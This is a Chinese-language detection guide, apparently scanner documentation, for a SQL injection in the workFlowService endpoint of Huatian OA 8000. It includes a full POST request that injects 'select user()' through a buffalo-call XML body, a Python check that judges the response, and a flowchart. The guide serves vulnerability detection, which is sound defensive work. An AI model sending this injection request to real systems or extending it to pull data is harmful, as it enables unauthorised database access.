# 华天动力OA 8000 workFlowService SQL注入漏洞（huatian-oa8000-sqli）检测说明

## 漏洞简介

华天动力OA 8000版本的workFlowService接口存在SQL注入漏洞，攻击者可通过该接口注入恶意SQL语句，获取数据库敏感信息。

## 影响范围

- 产品：华天动力OA 8000
- CVE编号：无（社区编号 huatian-oa8000-sqli）
- 危害等级：Critical

## 漏洞原理

/OAapp/bfapp/buffalo/workFlowService接口未对传入的SQL语句进行有效过滤，攻击者可通过POST请求注入任意SQL语句，造成信息泄露。

## 利用方式与攻击流程

1. 攻击者构造带有SQL注入payload的POST请求，payload中直接传入如`select user()`的SQL语句。
2. 服务器端未对参数进行安全处理，直接拼接执行SQL。
3. 数据库执行恶意SQL，返回特征数据。
4. 攻击者分析响应内容，确认漏洞存在。

## 探测原理与流程

### 探测请求的构造

```http
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: target.com

<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>
```

- payload中`<string>select user()</string>`用于判断是否存在注入点。

### 预期响应与交互

- 响应体需包含`<buffalo-reply>`和`<string>user()`，且Content-Type为`text/xml`。
- HTTP状态码为200。

### 判定逻辑

```python
def is_vulnerable(response):
    if response.status_code == 200 and 'text/xml' in response.headers.get('content-type', '') and '<buffalo-reply>' in response.text and '<string>user()' in response.text:
        return True
    return False
```

### 检测流程Mermaid图

```mermaid
graph TD
    A[发送带注入payload的POST请求] --> B[接收HTTP响应]
    B --> C{响应体含buffalo-reply和user()?}
    C -- 否 --> F[非漏洞]
    C -- 是 --> D{Content-Type为text/xml且状态码为200?}
    D -- 否 --> F
    D -- 是 --> G[判定存在SQL注入漏洞]
```

## 参考链接

- [PeiQi文库-华天动力OA 8000 workFlowService SQL注入漏洞](https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md) 